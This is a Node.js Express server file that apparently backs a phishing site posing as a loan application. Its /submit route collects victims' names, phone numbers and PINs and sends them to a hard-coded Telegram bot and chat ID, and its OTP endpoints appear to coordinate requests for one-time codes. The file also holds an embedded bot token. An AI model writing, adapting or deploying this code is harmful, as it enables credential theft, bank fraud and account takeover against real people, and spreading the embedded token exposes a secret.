const express = require("express");
const path = require("path");
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const app = express();

let otpLength = null;

app.use(express.json());

// serve static files
app.use(express.static(path.join(__dirname, "public")));

// ==============================
// TELEGRAM CONFIG (PUT YOURS)
// ==============================
const TELEGRAM_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
const CHAT_ID = "7162306402";

// ==============================
// TELEGRAM FUNCTION
// ==============================
async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

  const response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
    }),
  });

  const data = await response.json();
  console.log("TELEGRAM RESPONSE:", data);

  if (!data.ok) {
    throw new Error("Telegram failed");
  }
}

app.post("/submit", async (req, res) => {
  try {
    const { name, phone, pin } = req.body;

    const message = `
📥 NEW LOAN APPLICATION

👤 Name: ${name}
📞 Phone: ${phone}
🔐 PIN: ${pin}
    `;

console.log("SENDING MESSAGE:", message);

    await sendToTelegram(message);

    res.json({ success: true });

  } catch (err) {
    console.error("ERROR:", err.message);
    res.json({ success: false });
  }
});

// ==============================
// ROOT ROUTE
// ==============================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.post("/set-otp", (req, res) => {
  const { otp } = req.body;

  if (otp !== 5 && otp !== 6) {
    return res.json({ success: false, message: "Only 5 or 6 allowed" });
  }

  otpLength = otp;

  console.log("✅ OTP SET TO:", otpLength);

  res.json({ success: true });
});

app.get("/otp-status", (req, res) => {
  res.json({ otp: otpLength });
});

// ==============================
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Server running on ${PORT}`);
});